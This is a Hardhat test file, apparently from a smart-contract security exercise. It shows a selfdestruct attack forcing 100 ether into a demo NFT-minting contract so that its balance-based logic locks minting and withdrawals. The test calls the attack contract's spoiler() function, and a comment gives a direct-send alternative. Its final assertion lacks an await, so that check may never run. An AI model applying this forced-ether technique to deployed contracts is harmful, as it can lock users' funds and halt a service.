import { loadFixture } from "@nomicfoundation/hardhat-network-helpers"
import { expect } from "chai"
import { BigNumber, ContractTransaction } from "ethers"
import { parseEther } from "ethers/lib/utils"
import { ethers } from "hardhat"

describe("Self destruct attack", function () {
  let tx: ContractTransaction | Promise<ContractTransaction>
  const deployFixture = async () => {
    const [goodSigner, badSigner] = await ethers.getSigners()
    const MintByDepositingContractFactory = await ethers.getContractFactory('MintByDepositing')
    const MintByDepositing = await MintByDepositingContractFactory.deploy()
    const SelfDesctructAttackContractFactory = await ethers.getContractFactory('SelfDesctructAttack')
    const SelfDesctructAttack = await SelfDesctructAttackContractFactory.deploy(MintByDepositing.address)
    return { MintByDepositing, SelfDesctructAttack, goodSigner, badSigner }
  }
  describe("attack", function () {
    it("Should attack succeeded", async () => {
      const { MintByDepositing, SelfDesctructAttack, goodSigner, badSigner } = await loadFixture(deployFixture)

      // Start game
      await expect(MintByDepositing.connect(goodSigner).depositMintingEther({
        value: parseEther("10")
      })).to.revertedWith("You can only mint one NFT at a time")

      await MintByDepositing.connect(goodSigner).depositMintingEther({
        value: parseEther("1")
      })
      expect(await ethers.provider.getBalance(MintByDepositing.address)).to.equal(parseEther("1"))
      await expect(MintByDepositing.connect(goodSigner).receiveFunds()).to.revertedWith("Not winner")

      // exploit
      tx = await SelfDesctructAttack.connect(badSigner).spoiler({ value: parseEther("100") })
      // If contract has payable fallback, no need to call spoiler.
      // tx = await badSigner.sendTransaction({ to: MintByDepositing.address, value: parseEther("100"), gasLimit: 5000000 })
      expect(await ethers.provider.getBalance(MintByDepositing.address)).to.equal(parseEther("101"))
      expect(MintByDepositing.connect(goodSigner).depositMintingEther({
        value: parseEther("1")
      })).to.revertedWith("We have run out of NFTs")
      // lastMinter remain 0x address and no one can receive funds
    })
  })
})



